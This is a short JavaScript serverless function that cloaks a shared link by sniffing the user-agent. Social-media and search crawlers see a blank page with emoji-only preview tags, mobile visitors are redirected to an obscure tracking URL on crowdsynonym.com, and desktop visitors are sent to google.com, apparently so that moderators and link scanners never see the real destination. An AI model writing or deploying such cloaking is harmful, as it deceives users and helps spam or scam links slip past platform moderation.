export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get("user-agent") || "";

  // Facebook + Social Bots
  const isBot = /facebookexternalhit|Facebot|Twitterbot|LinkedInBot|WhatsApp|TelegramBot|Pinterest|Slackbot|Discordbot|Googlebot/i.test(userAgent);

  if (isBot) {
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Welcome</title>
  <meta property="og:title" content="❤️💚🧡">
  <meta property="og:description" content=" ">
  <meta property="og:image" content="https://www.google.com/share.google?q=AYuwgD9tSFqWVK655">
  <meta property="og:type" content="website">
  <meta name="twitter:card" content="summary_large_image">
</head>
<body>
</body>
</html>`;

    return new Response(html, {
      status: 200,
      headers: {
        "Content-Type": "text/html; charset=UTF-8",
        "Cache-Control": "public, max-age=3600"
      }
    });
  }

  // Real Users - Mobile
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://crowdsynonym.com/h45vjd72qe?key=0acbdd721b5a5090d4610e6eb926e9c1", 302);
  }

  // Desktop
  return Response.redirect("https://www.google.com", 302);
}
